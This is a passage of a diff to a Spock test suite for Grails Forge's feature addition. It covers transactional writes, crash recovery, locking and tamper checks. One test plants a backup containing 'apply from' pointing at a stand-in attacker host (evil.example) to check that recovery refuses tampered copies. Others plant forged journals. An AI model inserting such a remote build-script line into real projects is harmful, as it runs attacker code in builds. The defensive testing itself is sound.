@@ -20,13 +20,18 @@ package org.apache.grails.forge.core.change
 
 import java.nio.channels.FileChannel
 import java.nio.channels.FileLock
-import java.nio.charset.StandardCharsets
+import java.nio.file.FileVisitResult
 import java.nio.file.Files
 import java.nio.file.LinkOption
 import java.nio.file.Path
+import java.nio.file.SimpleFileVisitor
+import java.nio.file.StandardCopyOption
 import java.nio.file.StandardOpenOption
+import java.nio.file.attribute.BasicFileAttributes
 import java.nio.file.attribute.PosixFilePermissions
 import java.security.MessageDigest
+import java.util.concurrent.CyclicBarrier
+import java.util.concurrent.TimeUnit
 import org.apache.grails.forge.core.change.ChangePlan.Action
 import org.apache.grails.forge.core.state.ProjectState
 import org.grails.forge.ApplicationContextSpec
@@ -42,7 +47,9 @@ import org.grails.forge.options.Options
 import org.grails.forge.template.Template
 import org.grails.forge.util.NameUtils
 import spock.lang.IgnoreIf
+import spock.lang.Requires
 import spock.lang.TempDir
+import spock.lang.Timeout
 
 /**
  * What adding a feature does with files the features of Grails do not write: binary files, files
@@ -55,9 +62,18 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
     static final String FEATURE = 'grails-quartz'
     static final byte[] ICON = [0, 1, 2, 3, (byte) 0xff, 0, 7] as byte[]
     static final byte[] OTHER_ICON = [0, 9, 9, 9, (byte) 0xfe, 0, 7] as byte[]
+    static final String INTERRUPTED = 'An earlier change of the project was interrupted; it is undone when a feature is added without --dry-run and --diff, ' +
+            'and has to be before anything else is done'
 
     @TempDir
     Path directory
+
+    /** Where the journals of the changes are kept: in a directory of the user, which here is one of the test */
+    Path records
+
+    void setup() {
+        records = directory.resolve('home/.grails/forge/transactions')
+    }
 
     void "a feature is added as if the application had been created with it"() {
         given:
@@ -66,29 +82,34 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Path with = create(generator, 'with', [FEATURE])
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
 
         then:
         plan.requested == [FEATURE]
         plan.added.contains(FEATURE)
         plan.conflicts.isEmpty()
+        !plan.refused
         plan.files.find { it.path == 'build.gradle' }.action == Action.UPDATE
         plan.files.every { it.action in [Action.ADD, Action.UPDATE] }
 
-        and: 'nothing is written by a plan'
+        and: 'nothing is written by a plan, in the project or beside it'
         tree(project) != tree(with)
         !Files.exists(project.resolve('.grails/transactions'))
+        !Files.exists(records)
 
         when:
         plan.apply()
 
-        then: 'every file, and the state, is that of the application that was created with the feature'
+        then: 'every file and directory, and the state, is that of the application that was created with the feature'
         tree(project) == tree(with)
         ProjectState.read(project).verifyBaseline(project)
-        !Files.exists(project.resolve('.grails/transactions/current'))
+
+        and: 'nothing is left of the change but the lock'
+        left(project) == []
+        journals() == []
 
         when: 'again'
-        ChangePlan again = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan again = planOf(generator, project)
         again.apply()
 
         then:
@@ -100,17 +121,12 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
 
     void "a feature adds a binary file and a file that can be executed"() {
         given:
-        ProjectGenerator generator = generator { GeneratorContext context ->
-            if (context.features.contains(FEATURE)) {
-                context.addTemplate('icon', new Fixed('src/main/resources/icon.bin', ICON, true, false))
-                context.addTemplate('tool', new Fixed('bin/tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, true))
-            }
-        }
+        ProjectGenerator generator = withNewFiles()
         Path project = create(generator, 'app', [])
         Path with = create(generator, 'with', [FEATURE])
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         plan.apply()
 
         then:
@@ -126,21 +142,19 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
     }
 
     @IgnoreIf({ os.windows })
-    void "the file a feature adds can be executed when the feature says so"() {
+    void "the file a feature adds can be executed when the feature says so, and a file it replaces keeps its mode"() {
         given:
-        ProjectGenerator generator = generator { GeneratorContext context ->
-            if (context.features.contains(FEATURE)) {
-                context.addTemplate('tool', new Fixed('bin/tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, true))
-            }
-        }
+        ProjectGenerator generator = withNewFiles()
         Path project = create(generator, 'app', [])
+        Files.setPosixFilePermissions(project.resolve('build.gradle'), PosixFilePermissions.fromString('rw-r-----'))
 
         when:
-        new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP).apply()
+        planOf(generator, project).apply()
 
         then:
         Files.isExecutable(project.resolve('bin/tool.sh'))
-        !Files.isExecutable(project.resolve('build.gradle'))
+        PosixFilePermissions.toString(Files.getPosixFilePermissions(project.resolve('build.gradle'))) == 'rw-r-----'
+        project.resolve('build.gradle').toFile().text.contains('grails-quartz')
     }
 
     void "a binary file a feature changes is replaced when the project has it as it was generated"() {
@@ -150,7 +164,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Path with = create(generator, 'with', [FEATURE])
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         plan.apply()
 
         then:
@@ -168,11 +182,12 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Map<String, String> before = tree(project)
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
 
         then:
         plan.conflicts*.path == ['icon.bin']
         plan.conflicts[0].reason == 'the feature changes this binary file, and it was changed in the project too'
+        plan.conflicts[0].details == ['Put the file back as it was generated (its copy is .grails/baseline/files/icon.bin), add the feature, and make your change to the new file']
         plan.diff().contains('rejected: icon.bin (the feature changes this binary file, and it was changed in the project too)')
 
         when:
@@ -192,7 +207,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Files.write(project.resolve('icon.bin'), OTHER_ICON)
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         plan.apply()
 
         then:
@@ -213,7 +228,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         !Files.isExecutable(project.resolve('tool.sh'))
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         plan.apply()
 
         then:
@@ -225,7 +240,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         ProjectState.read(project).verifyBaseline(project)
     }
 
-    void "a feature that would leave a generated file out is refused"() {
+    void "a feature that would leave a generated file out is refused, and what it would do is shown"() {
         given:
         ProjectGenerator generator = generator { GeneratorContext context ->
             if (!context.features.contains(FEATURE)) {
@@ -236,12 +251,29 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Map<String, String> before = tree(project)
 
         when:
-        new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
+
+        then:
+        plan.refused
+        plan.refusal == 'Adding grails-quartz would leave out a file the application was generated with (only-without.txt), which adding a feature does not do. ' +
+                'An application has it when it is created with it (--features grails-quartz); to change this application by hand, feature add grails-quartz --diff ' +
+                'shows what would be added to its files and what would be removed, and the record under .grails then does not know of the change. Nothing was changed'
+        plan.files.find { it.path == 'only-without.txt' }.action == Action.REMOVE
+        plan.files.find { it.path == 'build.gradle' }.action == Action.UPDATE
+
+        and:
+        List<String> diff = plan.diff()
+        diff.containsAll(['--- a/only-without.txt', '+++ /dev/null', '-x'])
+        diff.contains('+    implementation "org.apache.grails:grails-quartz"')
+
+        when:
+        plan.apply()
 
         then:
         ProjectChangeException e = thrown()
-        e.message == 'Adding grails-quartz would leave out a file the application was generated with (only-without.txt), which adding a feature does not do; nothing was changed'
+        e.message == plan.refusal
         tree(project) == before
+        !Files.exists(project.resolve('.grails/transactions'))
     }
 
     void "an application that is not generated again as it was is refused"() {
@@ -254,7 +286,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Map<String, String> before = tree(project)
 
         when:
-        new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        planOf(generator, project)
 
         then:
         ProjectChangeException e = thrown()
@@ -262,86 +294,181 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         tree(project) == before
     }
 
-    void "a change that is interrupted is undone before the next one"() {
+    void "a change that is interrupted after any of its files is undone, also when undoing it is interrupted, and one that wrote its last file stays"() {
+        given:
+        ProjectGenerator generator = withNewFiles()
+        Path base = create(generator, 'app', [])
+        Path with = create(generator, 'with', [FEATURE])
+        Map<String, String> before = tree(base)
+        Map<String, String> added = tree(with)
+        List<String> writes = []
+        planOf(generator, copy(base, 'count')).apply { String path -> writes << path }
+
+        expect: 'files of the application, of which some are new and in new directories, and of the state'
+        writes.size() > 10
+        writes.containsAll(['build.gradle', 'bin/tool.sh', '.grails/baseline/files/bin/tool.sh', '.grails/baseline/index.yml', '.grails/forge.lock.yml'])
+        writes.last() == '.grails/project.yml'
+
+        when:
+        List<String> wrong = []
+        for (int point = 0; point < writes.size(); point++) {
+            Path project = copy(base, "at${point}")
+            int written = 0
+            try {
+                planOf(generator, project).apply { String path ->
+                    if (written++ == point) {
+                        throw new Stopped()
+                    }
+                }
+                wrong << "${point}: was not interrupted".toString()
+            } catch (Stopped ignored) {
+            }
+            if (journals().size() != 1 || left(project).size() != 1) {
+                wrong << "${point}: no journal, or no directory of the change".toString()
+            }
+            try {
+                planOf(generator, project)
+                wrong << "${point}: a plan was made of a project that is half changed".toString()
+            } catch (ProjectChangeException e) {
+                if (e.message != INTERRUPTED) {
+                    wrong << "${point}: ${e.message}".toString()
+                }
+            }
+            // the end of the change is itself interrupted, after the first file it puts back
+            boolean stopped = false
+            try {
+                addition(generator).recover(project) { String path ->
+                    if (!stopped) {
+                        stopped = true
+                        throw new Stopped()
+                    }
+                }
+            } catch (Stopped ignored) {
+            }
+            ProjectRecovery recovery = addition(generator).recover(project)
+            boolean last = point == writes.size() - 1
+            if (last ? tree(project) != added : tree(project) != before) {
+                wrong << "${point}: the project is not ${last ? 'the one with the feature' : 'as it was'}: ${differing(tree(project), last ? added : before)}".toString()
+            }
+            if (left(project) != [] || journals() != [] || addition(generator).recover(project).with { it.undone || it.completed }) {
+                wrong << "${point}: something is left of the change".toString()
+            }
+            if (!last && stopped && !recovery.undone) {
+                wrong << "${point}: the second recovery did not say that it undid the change".toString()
+            }
+            ProjectState.read(project).verifyBaseline(project)
+            planOf(generator, project).apply()
+            if (tree(project) != added) {
+                wrong << "${point}: adding the feature afterwards gives another project".toString()
+            }
+        }
+
+        then:
+        wrong == []
+    }
+
+    void "what was undone is said, file by file, and a change that had written everything is said to be complete"() {
         given:
         ProjectGenerator generator = generator()
         Path project = create(generator, 'app', [])
         Path with = create(generator, 'with', [FEATURE])
         Map<String, String> before = tree(project)
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
-        List<String> written = []
 
-        when: 'the program ends after the build file and before the state is written'
-        plan.apply { String path ->
-            written << path
-            if (path == 'build.gradle') {
-                throw new Stopped()
+        when:
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'build.gradle') {
+                    throw new Stopped()
+                }
             }
+        } catch (Stopped ignored) {
         }
+        List<String> told = []
+        ProjectRecovery recovery = addition(generator).recover(project) { String path -> told << path }
 
         then:
-        thrown(Stopped)
-        written.last() == 'build.gradle'
-        tree(project) != before
-        Files.exists(project.resolve('.grails/transactions/current/journal'))
+        recovery.undone
+        !recovery.completed
+        recovery.putBack == ['README.md', 'build.gradle']
+        told == ['build.gradle', 'README.md']
+        recovery.messages == ['An earlier change of the application that was interrupted was undone. 2 files were put back as they were: README.md, build.gradle']
+        tree(project) == before
 
-        when: 'nothing is planned on a project that is half changed'
-        new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        when: 'nothing was interrupted'
+        ProjectRecovery none = addition(generator).recover(project)
+
+        then:
+        !none.undone
+        !none.completed
+        none.messages == []
+
+        when: 'the program ends after the last file and before the journal is removed'
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == ProjectState.MANIFEST) {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        ProjectRecovery complete = addition(generator).recover(project) { String path -> told << path }
+
+        then:
+        complete.completed
+        !complete.undone
+        complete.putBack == []
+        told.size() == 2
+        complete.messages == ['An earlier change of the application was interrupted after its last file was written: it is complete, and was ended now']
+        tree(project) == tree(with)
+        left(project) == []
+        journals() == []
+    }
+
+    void "a file the change wrote that was changed after the interruption stops the undoing, and nothing is put back"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Map<String, String> before = tree(project)
+        List<String> written = []
+        try {
+            planOf(generator, project).apply { String path ->
+                written << path
+                if (path == ProjectState.BASELINE_INDEX) {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        byte[] asWritten = Files.readAllBytes(project.resolve('build.gradle'))
+        project.resolve('build.gradle').toFile() << '// written by an editor meanwhile\n'
+        Map<String, String> interrupted = tree(project)
+        String change = left(project).first()
+
+        when:
+        addition(generator).recover(project)
 
         then:
         ProjectChangeException e = thrown()
-        e.message.startsWith('An earlier change of the project was interrupted (.grails/transactions/current)')
+        e.message.startsWith('A file the change wrote was changed since: build.gradle. Nothing was put back. Put it back as it was before the change ' +
+                "(the files that were replaced are kept in .grails/transactions/${change}/backup, and a file that was new is to be removed), or as the change wrote it, " +
+                'and run the command again; or restore the project from version control and remove the file journal from the directory ')
 
-        when:
-        boolean undone = FeatureAddition.recover(project)
+        and: 'not one file'
+        tree(project) == interrupted
+
+        when: 'the file is made what the change wrote'
+        Files.write(project.resolve('build.gradle'), asWritten)
+        ProjectRecovery recovery = addition(generator).recover(project)
 
         then:
-        undone
+        recovery.undone
         tree(project) == before
-        !Files.exists(project.resolve('.grails/transactions/current'))
-        !FeatureAddition.recover(project)
+        left(project) == []
 
-        when:
-        new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP).apply()
-
-        then:
-        tree(project) == tree(with)
-    }
-
-    void "a change that was interrupted after its last file is undone too"() {
-        given:
-        ProjectGenerator generator = generator()
-        Path project = create(generator, 'app', [])
-        Map<String, String> before = tree(project)
-
-        when:
-        new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP).apply { String path ->
-            if (path == ProjectState.MANIFEST) {
-                throw new Stopped()
-            }
-        }
-
-        then:
-        thrown(Stopped)
-
-        when:
-        boolean undone = FeatureAddition.recover(project)
-
-        then:
-        undone
-        tree(project) == before
-        ProjectState.read(project).verifyBaseline(project)
-    }
-
-    void "a file that was changed after a change was interrupted is left as it is, until it is put back"() {
-        given:
-        ProjectGenerator generator = generator()
-        Path project = create(generator, 'app', [])
-        Map<String, String> before = tree(project)
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
-        List<String> written = []
+        when: 'again, and this time the file is put back from the copy that was kept'
+        written.clear()
         try {
-            plan.apply { String path ->
+            planOf(generator, project).apply { String path ->
                 written << path
                 if (path == ProjectState.BASELINE_INDEX) {
                     throw new Stopped()
@@ -350,26 +477,66 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         } catch (Stopped ignored) {
         }
         project.resolve('build.gradle').toFile() << '// written by an editor meanwhile\n'
+        Files.copy(project.resolve(".grails/transactions/${left(project).first()}/backup/${written.indexOf('build.gradle')}"), project.resolve('build.gradle'),
+                StandardCopyOption.REPLACE_EXISTING)
 
-        when:
-        FeatureAddition.recover(project)
+        then:
+        addition(generator).recover(project).undone
+        tree(project) == before
+    }
+
+    void "a file the change has not come to that is changed meanwhile ends the change, and is left with what was changed in it"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Map<String, String> before = tree(project)
+
+        when: 'an editor writes the configuration after the change replaced the build file'
+        planOf(generator, project).apply { String path ->
+            if (path == 'build.gradle') {
+                project.resolve('grails-app/conf/application.yml').toFile() << 'mine: true\n'
+            }
+        }
 
         then:
         ProjectChangeException e = thrown()
-        e.message.startsWith('A change of the project was interrupted and could not be undone: a file that was changed since is left as it is: build.gradle. ')
-        e.message.contains('.grails/transactions/current/backup')
-        project.resolve('build.gradle').toFile().text.endsWith('// written by an editor meanwhile\n')
+        e.message == 'grails-app/conf/application.yml was changed while the project was being changed; nothing was added, and the project is as it was before, ' +
+                'with what was changed in grails-app/conf/application.yml meanwhile'
 
-        and: 'every other file is as it was'
-        tree(project).findAll { it.key != 'build.gradle' && !it.key.startsWith('.grails/transactions/') } == before.findAll { it.key != 'build.gradle' }
+        and: 'the project is as it was, with the change of the editor, and nothing is in the way of the next command'
+        differing(tree(project), before) == ['grails-app/conf/application.yml']
+        project.resolve('grails-app/conf/application.yml').toFile().text.endsWith('mine: true\n')
+        left(project) == []
+        journals() == []
 
-        when: 'the file is put back from the copy that was kept'
-        int index = written.indexOf('build.gradle')
-        Files.copy(project.resolve(".grails/transactions/current/backup/${index}"), project.resolve('build.gradle'), java.nio.file.StandardCopyOption.REPLACE_EXISTING)
+        expect:
+        planOf(generator, project).files.find { it.path == 'grails-app/conf/application.yml' }.action in [Action.MERGE, Action.CONFLICT]
+    }
+
+    void "a change that was interrupted while an unwritten file was changed is undone, and that file is left as it is"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Map<String, String> before = tree(project)
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'build.gradle') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        project.resolve('grails-app/conf/application.yml').toFile() << 'mine: true\n'
+
+        when:
+        ProjectRecovery recovery = addition(generator).recover(project)
 
         then:
-        FeatureAddition.recover(project)
-        tree(project) == before
+        recovery.undone
+        recovery.keptAsTheyAre == ['grails-app/conf/application.yml']
+        recovery.messages[1] == 'The interrupted change had not come to grails-app/conf/application.yml, which was changed since and is left as it is'
+        differing(tree(project), before) == ['grails-app/conf/application.yml']
+        left(project) == []
     }
 
     @IgnoreIf({ os.windows || System.getProperty('user.name') == 'root' })
@@ -384,7 +551,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Path sealed = Files.createDirectory(project.resolve('sealed'))
         Files.setPosixFilePermissions(sealed, PosixFilePermissions.fromString('r-xr-xr-x'))
         Map<String, String> before = tree(project)
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         List<String> written = []
 
         when:
@@ -392,10 +559,11 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
 
         then:
         ProjectChangeException e = thrown()
-        e.message == 'sealed/new.txt could not be written (AccessDeniedException); the project is as it was before'
+        e.message == 'sealed/new.txt could not be written (AccessDeniedException); nothing was added, and the project is as it was before'
         written.contains('build.gradle')
         tree(project) == before
-        !Files.exists(project.resolve('.grails/transactions/current'))
+        left(project) == []
+        journals() == []
         ProjectState.read(project).verifyBaseline(project)
 
         cleanup:
@@ -406,7 +574,7 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         given:
         ProjectGenerator generator = generator()
         Path project = create(generator, 'app', [])
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         project.resolve('build.gradle').toFile() << '// written by an editor meanwhile\n'
         Map<String, String> before = tree(project)
 
@@ -417,14 +585,15 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         ProjectChangeException e = thrown()
         e.message == 'build.gradle was changed while the change of the project was being prepared; nothing of the project was changed'
         tree(project) == before
-        !Files.exists(project.resolve('.grails/transactions/current'))
+        left(project) == []
+        journals() == []
     }
 
     void "one command changes a project at a time"() {
         given:
         ProjectGenerator generator = generator()
         Path project = create(generator, 'app', [])
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
         Map<String, String> before = tree(project)
         Files.createDirectories(project.resolve('.grails/transactions'))
         FileChannel channel = FileChannel.open(project.resolve('.grails/transactions/lock'), StandardOpenOption.CREATE, StandardOpenOption.WRITE)
@@ -449,6 +618,76 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         channel?.close()
     }
 
+    @Timeout(value = 900, unit = TimeUnit.SECONDS)
+    void "of two changes that begin at once one is made, and the other is told that the project is being changed or was"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path base = create(generator, 'app', [])
+        List<String> outcomes = []
+
+        when:
+        for (int round = 0; round < 3; round++) {
+            Path project = copy(base, "round${round}")
+            List<ChangePlan> plans = [planOf(generator, project), planOf(generator, project, ['asciidoctor'])]
+            CyclicBarrier together = new CyclicBarrier(2)
+            List<String> said = Collections.synchronizedList([])
+            List<Thread> threads = plans.collect { ChangePlan each ->
+                Thread.start {
+                    together.await(300, TimeUnit.SECONDS)
+                    try {
+                        each.apply()
+                        said << 'made'
+                    } catch (ProjectChangeException e) {
+                        said << e.message
+                    }
+                }
+            }
+            threads*.join(600000)
+            outcomes.addAll(said.findAll { it != 'made' })
+            assert said.count('made') == 1
+            assert left(project) == []
+            ProjectState.read(project).verifyBaseline(project)
+        }
+
+        then:
+        outcomes.size() == 3
+        outcomes.every {
+            it == 'Another command is changing the project; nothing was changed by this one. Run it again when the other has ended' ||
+                    it.endsWith('was changed while the change of the project was being prepared; nothing of the project was changed')
+        }
+    }
+
+    @IgnoreIf({ os.windows })
+    @Timeout(value = 600, unit = TimeUnit.SECONDS)
+    void "a lock that is no file is refused and not opened"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        ChangePlan plan = planOf(generator, project)
+        Files.createDirectories(project.resolve('.grails/transactions'))
+        Process made = new ProcessBuilder('mkfifo', project.resolve('.grails/transactions/lock').toString()).start()
+
+        expect:
+        made.waitFor() == 0
+
+        when: 'a pipe of the name, which would keep whoever opens it waiting'
+        plan.apply()
+
+        then:
+        ProjectChangeException e = thrown()
+        e.message == 'The lock of the project, .grails/transactions/lock, is not a file; remove it. Nothing of the project was changed'
+
+        when: 'a link of the name'
+        Files.delete(project.resolve('.grails/transactions/lock'))
+        Files.createSymbolicLink(project.resolve('.grails/transactions/lock'), directory.resolve('elsewhere'))
+        plan.apply()
+
+        then:
+        ProjectChangeException linked = thrown()
+        linked.message == e.message
+        !Files.exists(directory.resolve('elsewhere'))
+    }
+
     @IgnoreIf({ os.windows })
     void "a link where a feature changes a file is a conflict"() {
         given:
@@ -459,10 +698,288 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         Files.createSymbolicLink(project.resolve('build.gradle'), elsewhere)
 
         when:
-        ChangePlan plan = new FeatureAddition(generator).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+        ChangePlan plan = planOf(generator, project)
 
         then:
         plan.conflicts.find { it.path == 'build.gradle' }.reason == 'the feature changes this file, and in the project it is a symbolic link'
+    }
+
+    @Requires({ FeatureAdditionSpec.ignoresCase() })
+    void "a file that has its name in other letters is a conflict, and keeps its name"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Files.move(project.resolve('build.gradle'), project.resolve('build.gradle.tmp'))
+        Files.move(project.resolve('build.gradle.tmp'), project.resolve('Build.gradle'))
+        Map<String, String> before = tree(project)
+
+        when:
+        ChangePlan plan = planOf(generator, project)
+
+        then:
+        plan.conflicts*.path == ['build.gradle']
+        plan.conflicts[0].reason == 'the feature changes this file, and in the project it is named Build.gradle'
+        plan.conflicts[0].details == ['Give the file the name build.gradle, add the feature, and give it its name back']
+        tree(project) == before
+        before.containsKey('Build.gradle')
+    }
+
+    void "what is in the directory of the changes and is of no change of this user is not read, and is left where it is"() {
+        given: 'a journal as an earlier version wrote it into the project, which names a file of the user to remove'
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Path with = create(generator, 'with', [FEATURE])
+        Files.writeString(project.resolve('secret.txt'), 'the user wrote this\n')
+        Path current = Files.createDirectories(project.resolve('.grails/transactions/current/backup')).parent
+        Files.writeString(current.resolve('journal'), "grails-forge-transaction 1\nput 0 - ${sha(project.resolve('secret.txt'))} secret.txt\nend\n")
+        Map<String, String> before = tree(project)
+
+        when:
+        ProjectRecovery recovery = addition(generator).recover(project)
+
+        then:
+        !recovery.undone
+        !recovery.completed
+        recovery.strangers == ['current']
+        recovery.messages == ['.grails/transactions has current, which no change this command began left there: it was not read and is left alone. It can be removed']
+        tree(project) == before
+
+        when: 'a feature is added all the same'
+        planOf(generator, project).apply()
+
+        then:
+        left(project) == ['current']
+        project.resolve('secret.txt').toFile().text == 'the user wrote this\n'
+        tree(project).findAll { !it.key.startsWith('.grails/transactions/') && it.key != 'secret.txt' } == tree(with)
+    }
+
+    void "a journal that names what the generator does not write, or that is of another project, undoes nothing"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Files.writeString(project.resolve('secret.txt'), 'the user wrote this\n')
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'build.gradle') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        Path journal = journals().first()
+        String written = journal.toFile().text
+        Map<String, String> interrupted = tree(project)
+
+        when: 'a line more, for a file of the user'
+        journal.toFile().text = written.replace('\nend\n', "\nput 99 - ${sha(project.resolve('secret.txt'))} secret.txt\nend\n")
+        addition(generator).recover(project)
+
+        then:
+        ProjectChangeException e = thrown()
+        e.message.startsWith('The record of the change that was interrupted names what is no file of the generated application (secret.txt); nothing was put back.')
+        tree(project) == interrupted
+
+        when: 'a directory of the user to remove'
+        Files.createDirectory(project.resolve('empty'))
+        journal.toFile().text = written.replace('\nend\n', '\ndir empty\nend\n')
+        addition(generator).recover(project)
+
+        then:
+        ProjectChangeException directories = thrown()
+        directories.message.startsWith('The record of the change that was interrupted names what is no file of the generated application (empty); nothing was put back.')
+        Files.isDirectory(project.resolve('empty'))
+
+        when: 'the journal of this project where that of another is looked for'
+        Path other = create(generator, 'other', [])
+        Path of = Files.createDirectories(records.resolve(sha(other.toRealPath().toString().getBytes('UTF-8'))))
+        Files.writeString(of.resolve('journal'), written)
+        Map<String, String> untouched = tree(other)
+        addition(generator).recover(other)
+
+        then:
+        ProjectChangeException another = thrown()
+        another.message.startsWith('The record of a change of the project that was interrupted cannot be read; restore the project from version control and remove the file journal ')
+        tree(other) == untouched
+
+        when: 'the journal as it was written'
+        journal.toFile().text = written
+
+        then:
+        addition(generator).recover(project).undone
+    }
+
+    @IgnoreIf({ os.windows })
+    void "a directory of the change that is a link, and a copy that is not what the file was, undo nothing"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        List<String> written = []
+        try {
+            planOf(generator, project).apply { String path ->
+                written << path
+                if (path == 'build.gradle') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        Path change = project.resolve('.grails/transactions').resolve(left(project).first())
+        Path outside = Files.createDirectory(directory.resolve('outside'))
+        Files.move(change.resolve('backup'), outside.resolve('backup'))
+        Files.createSymbolicLink(change.resolve('backup'), outside.resolve('backup'))
+        Map<String, String> interrupted = tree(project)
+        Map<String, String> outsideBefore = tree(outside)
+
+        when:
+        addition(generator).recover(project)
+
+        then:
+        ProjectChangeException e = thrown()
+        e.message.startsWith(".grails/transactions/${change.fileName}, where the change that was interrupted keeps the files it replaced, is not the directory it was; nothing was put back.")
+        tree(project) == interrupted
+        tree(outside) == outsideBefore
+
+        when: 'the directory again, with another file in the place of a copy'
+        Files.delete(change.resolve('backup'))
+        Files.move(outside.resolve('backup'), change.resolve('backup'))
+        Path copy = change.resolve("backup/${written.indexOf('build.gradle')}")
+        byte[] kept = Files.readAllBytes(copy)
+        Files.writeString(copy, 'apply from: "https://evil.example/build.gradle"\n')
+        interrupted = tree(project)
+        addition(generator).recover(project)
+
+        then:
+        ProjectChangeException changed = thrown()
+        changed.message.startsWith("The copy of build.gradle that was kept in .grails/transactions/${change.fileName}/backup is not what the file was; nothing was put back.")
+        tree(project) == interrupted
+
+        when:
+        Files.write(copy, kept)
+
+        then:
+        addition(generator).recover(project).undone
+    }
+
+    void "a directory for the journals that cannot be used stops a change before anything is written"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Files.createDirectories(records.parent)
+        Files.writeString(records, 'a file where the directory is to be')
+        Map<String, String> before = tree(project)
+
+        when:
+        planOf(generator, project).apply()
+
+        then:
+        ProjectChangeException e = thrown()
+        e.message == 'The directory the records of changes are kept in, .grails/forge/transactions in the home directory of the user, cannot be used (Not a directory); ' +
+                'nothing of the project was changed'
+        tree(project) == before
+    }
+
+    @Timeout(value = 900, unit = TimeUnit.SECONDS)
+    void "a file with more lines, or more changes, than are merged is a conflict, and found to be one at once"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        String build = project.resolve('build.gradle').toFile().text
+
+        when: 'a build file that is not the generated one any more'
+        project.resolve('build.gradle').toFile().text = (0..<300000).collect { "// line ${it} of the project" }.join('\n') + '\n'
